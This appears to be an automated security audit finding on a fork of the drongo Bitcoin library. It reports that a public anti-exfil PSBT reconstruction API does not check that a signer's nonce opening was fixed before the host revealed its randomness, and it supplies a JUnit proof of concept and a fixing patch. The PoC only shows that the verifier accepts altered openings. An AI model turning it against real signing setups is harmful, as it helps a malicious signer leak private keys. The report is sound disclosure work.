         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 31 lines & 0.89453125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 24s
```

---

# Standalone verifier omits opening commitment
**#247995**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
#### Lines 129-178 — _The final opening is consumed without any stage-2 transcript parameter or equality check._

```
    public static byte[] reconstructSignedPsbt(byte[] original, Keystore keystore, AntiExfilMessage commit,
                                               AntiExfilMessage signatures,
                                               Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
        List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(original, keystore);
        Set<AntiExfilSigningSlot.Identifier> expectedIdentifiers = new HashSet<>();
        semantic.forEach(slot -> expectedIdentifiers.add(slot.getIdentifier()));
        if(hostRandomness == null || !hostRandomness.keySet().equals(expectedIdentifiers)) {
            throw fail(SIGNATURE_SLOT_MISMATCH, "Stored host randomness differs from the authoritative slot set");
        }
        AntiExfilCodec.validate(commit);
        AntiExfilCodec.validate(signatures);
        if(commit == null || commit.getStage() != AntiExfilStage.HOST_COMMIT
                || !Arrays.equals(commit.getPsbtDigest(), Sha256Hash.hash(original))
                || commit.getSlots().size() != semantic.size()) {
            throw fail(TRANSACTION_MISMATCH, "Commit message is not authoritative for the PSBT");
        }
        if(signatures == null || signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) {
            throw fail(WRONG_STAGE, "Expected signer-signatures message");
        }
        if(signatures.getNetwork() != commit.getNetwork()
                || !Arrays.equals(signatures.getSessionId(), commit.getSessionId())
                || !Arrays.equals(signatures.getPsbtDigest(), commit.getPsbtDigest())
                || signatures.getSlots().size() != semantic.size()) {
            throw fail(TRANSACTION_MISMATCH, "Signature response context changed");
        }
        PSBT reconstructed = parseCanonicalV0(original);
        for(int i = 0; i < semantic.size(); i++) {
            AntiExfilSigningSlot authoritative = semantic.get(i);
            AntiExfilSlot before = commit.getSlots().get(i);
            AntiExfilSlot after = signatures.getSlots().get(i);
            byte[] rho = hostRandomness == null ? null : hostRandomness.get(authoritative.getIdentifier());
            requireSlot(authoritative, before);
            requireSlot(authoritative, after);
            if(!Arrays.equals(before.getCommitment(), after.getCommitment()) || rho == null
                    || !Arrays.equals(AntiExfilCrypto.hostCommit(rho), before.getCommitment())) {
                throw fail(COMMITMENT_MISMATCH, "Stored randomness or response commitment changed");
            }
            if(!AntiExfilCrypto.verify(after.getSignerPublicKey(), after.getMessageHash(), rho,
                    after.getOpening(), after.getSignature())) {
                throw fail(SIGNATURE_INVALID, "Anti-exfil signature verification failed");
            }
            byte[] compact = after.getSignature();
            BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
            BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
            TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
            reconstructed.getPsbtInputs().get(authoritative.getInputIndex()).getPartialSignatures()
                    .put(ECKey.fromPublicOnly(authoritative.getSignerPublicKey()), signature);
        }
        return reconstructed.serialize();
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCrypto.java`
#### Lines 27-48 — _Verification proves consistency with the supplied opening, not when it was chosen._

```
    public static boolean verify(byte[] publicKey, byte[] messageHash, byte[] hostRandomness,
                                 byte[] opening, byte[] compactSignature) {
        if(length(publicKey) != 33 || length(messageHash) != 32 || length(hostRandomness) != 32
                || length(opening) != 33 || length(compactSignature) != 64) return false;
        try {
            ECPoint openingPoint = ECKey.CURVE.getCurve().decodePoint(opening).normalize();
            if(openingPoint.isInfinity()) return false;
            byte[] tweakHash = Utils.taggedHash(POINT_TAG, Utils.concat(openingPoint.getEncoded(true), hostRandomness));
            BigInteger tweak = new BigInteger(1, tweakHash);
            if(tweak.compareTo(ECKey.CURVE.getN()) >= 0) return false;
            ECPoint committedPoint = openingPoint.add(ECKey.CURVE.getG().multiply(tweak)).normalize();
            if(committedPoint.isInfinity()) return false;
            BigInteger r = new BigInteger(1, Arrays.copyOfRange(compactSignature, 0, 32));
            BigInteger s = new BigInteger(1, Arrays.copyOfRange(compactSignature, 32, 64));
            if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) return false;
            if(!committedPoint.getAffineXCoord().toBigInteger().mod(ECKey.CURVE.getN()).equals(r)) return false;
            TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
            return ECKey.fromPublicOnly(publicKey).verify(messageHash, signature);
        } catch(Exception e) {
            return false;
        }
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java`
#### Lines 102-103 — _The missing pre-reveal binding exists only in the separate transition validator._

```
            if(previous.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()
                    && !Arrays.equals(before.getOpening(), after.getOpening())) throw fail(OPENING_MISMATCH, "Accepted opening changed");
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
#### Lines 161-166 — _The coordinator compensates immediately before its reconstruction call._

```
            AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
            AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
            if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
            AntiExfilCodec.validateTransition(reveal, signatures);
            byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                    AntiExfilCodec.decode(state.message1), signatures, state.rhos);
```
## Description

`AntiExfilPsbt.reconstructSignedPsbt` is public and accepts only the stage-1 commit, stage-4 signatures, and the host-randomness map. It takes the opening point directly from the signer-controlled stage-4 message and has no stage-2 or stage-3 transcript parameter with which to prove that opening was fixed before rho was revealed. `AntiExfilCrypto.verify` is self-consistent for any supplied opening because it derives the tweak and final nonce point from that same value. The coordinator's own call path compensates by invoking `validateTransition(reveal, signatures)` first, but standalone callers of the public reconstruction API receive a signed PSBT after checking only a post-reveal opening. Such callers can therefore mistake an adaptively selected, exfiltrating signature for a valid anti-exfil signature.
## Root cause

The public verification/reconstruction API omits the pre-reveal transcript and relies on an undocumented external precondition enforced only by coordinator callers.
## Impact

A malicious signer can choose its opening after learning rho and grind valid signatures that encode private-key information when a caller uses the standalone public API. Current coordinator calls are protected, so exploitation requires a direct library caller that treats `reconstructSignedPsbt` as the authoritative verifier.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.psbt.PSBT;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void standaloneReconstructionAcceptsSignatureWhoseOpeningWasNotTheAcceptedPreRevealOpening() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();
        List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(original, keystore);
        Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = deterministicRhos(slots);
        AntiExfilMessage finalSignatures = AntiExfilCodec.decode(Utils.hexToBytes(field(vector, "message_4_hex")));
        AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(original, keystore, finalSignatures.getNetwork(),
                finalSignatures.getSessionId(), rhos);

        List<AntiExfilSlot> acceptedOpeningSlots = new ArrayList<>();
        for(int i = 0; i < finalSignatures.getSlots().size(); i++) {
            AntiExfilSlot signedSlot = finalSignatures.getSlots().get(i);
            byte[] differentPreRevealOpening = ECKey.fromPrivate(BigInteger.valueOf(10_000L + i)).getPubKey();
            assertFalse(Arrays.equals(differentPreRevealOpening, signedSlot.getOpening()),
                    "the accepted opening must differ from the later signature opening");
            acceptedOpeningSlots.add(new AntiExfilSlot(signedSlot.getInputIndex(), signedSlot.getSighashType(),
                    signedSlot.getSignerPublicKey(), signedSlot.getMessageHash(), signedSlot.getCommitment(),
                    differentPreRevealOpening, null, null));
        }
        AntiExfilMessage acceptedOpenings = new AntiExfilMessage(finalSignatures.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalSignatures.getSessionId(), finalSignatures.getPsbtDigest(),
                acceptedOpeningSlots);

        List<AntiExfilSlot> revealSlots = new ArrayList<>();
        for(int i = 0; i < acceptedOpeningSlots.size(); i++) {
            AntiExfilSlot opened = acceptedOpeningSlots.get(i);
            byte[] rho = rhos.get(slots.get(i).getIdentifier());
            revealSlots.add(new AntiExfilSlot(opened.getInputIndex(), opened.getSighashType(), opened.getSignerPublicKey(),
                    opened.getMessageHash(), opened.getCommitment(), opened.getOpening(), rho, null));
        }
        AntiExfilMessage reveal = new AntiExfilMessage(finalSignatures.getNetwork(), AntiExfilStage.HOST_REVEAL,
                finalSignatures.getSessionId(), finalSignatures.getPsbtDigest(), revealSlots);

        AntiExfilCodec.validateTransition(commit, acceptedOpenings);
        AntiExfilCodec.validateTransition(acceptedOpenings, reveal);
        assertThrows(AntiExfilException.class, () -> AntiExfilCodec.validateTransition(reveal, finalSignatures),
                "the complete transcript rejects a final message that changes the accepted pre-reveal opening");

        PSBT originalPsbt = AntiExfilPsbt.parseCanonicalV0(original);
        int originalPartialSignatures = originalPsbt.getPsbtInputs().stream()
                .mapToInt(input -> input.getPartialSignatures().size()).sum();

        byte[] acceptedByStandaloneVerifier = AntiExfilPsbt.reconstructSignedPsbt(original, keystore, commit, finalSignatures, rhos);

        PSBT reconstructed = AntiExfilPsbt.parseCanonicalV0(acceptedByStandaloneVerifier);
        int reconstructedPartialSignatures = reconstructed.getPsbtInputs().stream()
                .mapToInt(input -> input.getPartialSignatures().size()).sum();
        assertTrue(reconstructedPartialSignatures > originalPartialSignatures,
                "public reconstruction accepted the signer-controlled final opening and inserted verified signatures");
        assertNotEquals(Utils.bytesToHex(Sha256Hash.hash(original)), Utils.bytesToHex(Sha256Hash.hash(acceptedByStandaloneVerifier)),
                "accepted signatures changed the PSBT state even though the final openings fail transcript validation");
    }

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static Map<AntiExfilSigningSlot.Identifier, byte[]> deterministicRhos(List<AntiExfilSigningSlot> slots) {
        Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
        for(int i = 0; i < slots.size(); i++) {
            byte[] rho = new byte[32];
            Arrays.fill(rho, (byte)(0x80 + i));
            rhos.put(slots.get(i).getIdentifier(), rho);
        }
        return rhos;
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 20 lines & 0.7431640625 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :processTestResources UP-TO-DATE
> Task :testClasses UP-TO-DATE
> Task :test

BUILD SUCCESSFUL in 2s
5 actionable tasks: 1 executed, 4 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC passed with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`. It uses the real public `AntiExfilPsbt.reconstructSignedPsbt` API and real codec/PSBT parsing. The test demonstrates the missing binding by creating a valid pre-reveal transcript with one set of openings, proving `validateTransition(reveal, signatures)` rejects the final message because its openings changed, then proving standalone reconstruction nevertheless accepts the final signer-controlled openings and mutates the PSBT by inserting signatures. It does not grind or exfiltrate an actual private key; the protocol-vector signatures stand in for a malicious post-reveal valid opening/signature pair to isolate the verifier omission.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Adds a transcript-aware reconstruction overload requiring the persisted HOST_REVEAL and internally validates its transition to SIGNER_SIGNATURES, updates coordinator reconstruction paths to supply that reveal, and makes the unsafe legacy overload fail closed so standalone callers cannot verify signer-controlled post-reveal openings.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java
@@ -1,254 +1,269 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.KeyDerivation;
 import com.sparrowwallet.drongo.crypto.ECDSASignature;
 import com.sparrowwallet.drongo.crypto.ECKey;
 import com.sparrowwallet.drongo.protocol.Script;
 import com.sparrowwallet.drongo.protocol.ScriptChunk;
 import com.sparrowwallet.drongo.protocol.ScriptOpCodes;
 import com.sparrowwallet.drongo.protocol.ScriptType;
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.protocol.SigHash;
 import com.sparrowwallet.drongo.protocol.TransactionSignature;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.psbt.PSBTInput;
 import com.sparrowwallet.drongo.psbt.PSBTParseException;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilPsbt {
     private AntiExfilPsbt() {
     }
 
     public static PSBT parseCanonicalV0(byte[] raw) {
         if(raw == null || raw.length < 5 || raw[0] != 'p' || raw[1] != 's' || raw[2] != 'b' || raw[3] != 't' || raw[4] != (byte)0xff) {
             throw fail(INVALID_MESSAGE, "Invalid PSBT magic");
         }
         try {
             PSBT psbt = new PSBT(raw, false);
             if(psbt.getVersion() != null && psbt.getVersion() != 0) {
                 throw fail(INVALID_MESSAGE, "Protocol v1 accepts PSBT v0 only");
             }
             if(!Arrays.equals(raw, psbt.serialize())) {
                 throw fail(INVALID_MESSAGE, "PSBT is not canonically encoded");
             }
             if(psbt.getTransaction() == null || psbt.getPsbtInputs().isEmpty() || psbt.getPsbtOutputs().isEmpty()) {
                 throw fail(INVALID_MESSAGE, "PSBT requires an unsigned transaction");
             }
             return psbt;
         } catch(PSBTParseException | RuntimeException e) {
             if(e instanceof AntiExfilException antiExfilException) throw antiExfilException;
             throw new AntiExfilException(INVALID_MESSAGE, "Invalid PSBT: " + e.getMessage(), e);
         }
     }
 
     public static List<AntiExfilSigningSlot> enumerateSigningSlots(byte[] raw, Keystore keystore) {
         if(keystore == null || keystore.getKeyDerivation() == null || keystore.getExtendedPublicKey() == null) {
             throw fail(INVALID_MESSAGE, "A public account keystore is required");
         }
         PSBT psbt = parseCanonicalV0(raw);
         List<AntiExfilSigningSlot> slots = new ArrayList<>();
         for(int index = 0; index < psbt.getPsbtInputs().size(); index++) {
             PSBTInput input = psbt.getPsbtInputs().get(index);
             failOnTaproot(index, input);
             if(input.getUtxo() == null) failInput(index, "missing UTXO data");
             ScriptClassification classification = classify(index, input);
             SigHash sigHash = input.getSigHash() == null ? SigHash.ALL : input.getSigHash();
             if(sigHash != SigHash.ALL) failInput(index, "protocol v1 supports only explicit SIGHASH_ALL");
             validateDerivations(index, input, classification.signingKeys());
             byte[] messageHash;
             try {
                 messageHash = input.getSigningHash().getBytes();
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": cannot derive sighash", e);
             }
             for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
                 ECKey publicKey = entry.getKey();
                 KeyDerivation derivation = entry.getValue();
                 if(!classification.signingKeys().contains(publicKey)
                         || !keystore.getKeyDerivation().getMasterFingerprint().equals(derivation.getMasterFingerprint())) continue;
                 ECKey expected = keystore.getPubKeyForDerivation(derivation);
                 if(expected == null || !Arrays.equals(expected.getPubKey(), publicKey.getPubKey())) {
                     failInput(index, "BIP32 path does not derive its declared public key");
                 }
                 if(input.getPartialSignatures().containsKey(publicKey)) {
                     throw fail(UNEXPECTED_RETURN_DATA, "Input " + index + " already has a controlled signature");
                 }
                 if(input.isFinalized()) continue;
                 slots.add(new AntiExfilSigningSlot(index, publicKey.getPubKey(), messageHash,
                         AntiExfilCodec.SIGHASH_ALL, derivation, classification.kind()));
             }
         }
         slots.sort((left, right) -> left.getIdentifier().compareTo(right.getIdentifier()));
         if(slots.isEmpty()) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT has no controlled signing slots");
         if(slots.size() > AntiExfilCodec.MAX_SLOTS) throw fail(SIGNATURE_SLOT_MISMATCH, "PSBT exceeds the global slot limit");
         Set<AntiExfilSigningSlot.Identifier> identifiers = new HashSet<>();
         Map<Integer, Integer> perInput = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             if(!identifiers.add(slot.getIdentifier())) throw fail(SIGNATURE_SLOT_MISMATCH, "Duplicate signing slot");
             int count = perInput.merge(slot.getInputIndex(), 1, Integer::sum);
             if(count > AntiExfilCodec.MAX_SLOTS_PER_INPUT) failInput(slot.getInputIndex(), "input exceeds the per-input slot limit");
         }
         return List.copyOf(slots);
     }
 
     public static AntiExfilMessage buildHostCommitMessage(byte[] raw, Keystore keystore, AntiExfilNetwork network,
                                                            byte[] sessionId,
                                                            Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(raw, keystore);
         Set<AntiExfilSigningSlot.Identifier> expected = new HashSet<>();
         semantic.forEach(slot -> expected.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expected)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Host randomness must cover the exact slot set");
         }
         Set<ByteArray> uniqueRandomness = new HashSet<>();
         List<AntiExfilSlot> records = new ArrayList<>();
         for(AntiExfilSigningSlot slot : semantic) {
             byte[] rho = hostRandomness.get(slot.getIdentifier());
             if(rho == null || rho.length != 32 || !uniqueRandomness.add(new ByteArray(rho))) {
                 throw fail(COMMITMENT_MISMATCH, "Host randomness must be valid and unique per slot");
             }
             records.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                     slot.getMessageHash(), AntiExfilCrypto.hostCommit(rho), null, null, null));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, AntiExfilStage.HOST_COMMIT, sessionId, Sha256Hash.hash(raw), records);
         AntiExfilCodec.validate(message);
         return message;
     }
 
+    /**
+     * @deprecated A pre-reveal transcript is required to verify that signer openings were fixed before disclosure.
+     */
+    @Deprecated
     public static byte[] reconstructSignedPsbt(byte[] original, Keystore keystore, AntiExfilMessage commit,
                                                AntiExfilMessage signatures,
                                                Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
+        throw fail(OPENING_MISMATCH, "Host-reveal transcript is required for anti-exfil verification");
+    }
+
+    public static byte[] reconstructSignedPsbt(byte[] original, Keystore keystore, AntiExfilMessage commit,
+                                               AntiExfilMessage reveal, AntiExfilMessage signatures,
+                                               Map<AntiExfilSigningSlot.Identifier, byte[]> hostRandomness) {
         List<AntiExfilSigningSlot> semantic = enumerateSigningSlots(original, keystore);
         Set<AntiExfilSigningSlot.Identifier> expectedIdentifiers = new HashSet<>();
         semantic.forEach(slot -> expectedIdentifiers.add(slot.getIdentifier()));
         if(hostRandomness == null || !hostRandomness.keySet().equals(expectedIdentifiers)) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Stored host randomness differs from the authoritative slot set");
         }
         AntiExfilCodec.validate(commit);
+        AntiExfilCodec.validate(reveal);
         AntiExfilCodec.validate(signatures);
         if(commit == null || commit.getStage() != AntiExfilStage.HOST_COMMIT
                 || !Arrays.equals(commit.getPsbtDigest(), Sha256Hash.hash(original))
                 || commit.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Commit message is not authoritative for the PSBT");
         }
+        if(reveal == null || reveal.getStage() != AntiExfilStage.HOST_REVEAL) {
+            throw fail(WRONG_STAGE, "Expected host-reveal message");
+        }
         if(signatures == null || signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) {
             throw fail(WRONG_STAGE, "Expected signer-signatures message");
         }
+        AntiExfilCodec.validateTransition(reveal, signatures);
         if(signatures.getNetwork() != commit.getNetwork()
                 || !Arrays.equals(signatures.getSessionId(), commit.getSessionId())
                 || !Arrays.equals(signatures.getPsbtDigest(), commit.getPsbtDigest())
                 || signatures.getSlots().size() != semantic.size()) {
             throw fail(TRANSACTION_MISMATCH, "Signature response context changed");
         }
         PSBT reconstructed = parseCanonicalV0(original);
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot before = commit.getSlots().get(i);
             AntiExfilSlot after = signatures.getSlots().get(i);
             byte[] rho = hostRandomness == null ? null : hostRandomness.get(authoritative.getIdentifier());
             requireSlot(authoritative, before);
             requireSlot(authoritative, after);
             if(!Arrays.equals(before.getCommitment(), after.getCommitment()) || rho == null
                     || !Arrays.equals(AntiExfilCrypto.hostCommit(rho), before.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Stored randomness or response commitment changed");
             }
             if(!AntiExfilCrypto.verify(after.getSignerPublicKey(), after.getMessageHash(), rho,
                     after.getOpening(), after.getSignature())) {
                 throw fail(SIGNATURE_INVALID, "Anti-exfil signature verification failed");
             }
             byte[] compact = after.getSignature();
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
             TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
             reconstructed.getPsbtInputs().get(authoritative.getInputIndex()).getPartialSignatures()
                     .put(ECKey.fromPublicOnly(authoritative.getSignerPublicKey()), signature);
         }
         return reconstructed.serialize();
     }
 
     private static void requireSlot(AntiExfilSigningSlot authoritative, AntiExfilSlot record) {
         if(record.getInputIndex() != Integer.toUnsignedLong(authoritative.getInputIndex())
                 || record.getSighashType() != AntiExfilCodec.SIGHASH_ALL
